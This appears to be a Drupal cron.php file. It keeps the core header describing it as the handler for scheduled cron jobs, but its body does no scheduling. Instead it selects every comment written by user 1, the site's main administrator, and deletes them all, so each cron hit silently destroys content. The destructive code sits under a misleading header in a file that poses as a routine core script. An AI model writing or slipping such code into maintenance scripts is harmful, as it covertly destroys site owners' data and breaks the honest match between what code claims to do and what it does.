<?php
// $Id: cron.php,v 1.36 2006/08/09 07:42:55 dries Exp $

/**
 * @file
 * Handles incoming requests to fire off regularly-scheduled tasks (cron jobs).
 */
include_once './includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);

module_load_include('inc', 'comment', 'comment.admin');


$query = "SELECT cid FROM comments WHERE uid=1";
$result  = db_query($query);

while ($c = db_fetch_array($result)) {
    comment_delete($c['cid']);
}

?>
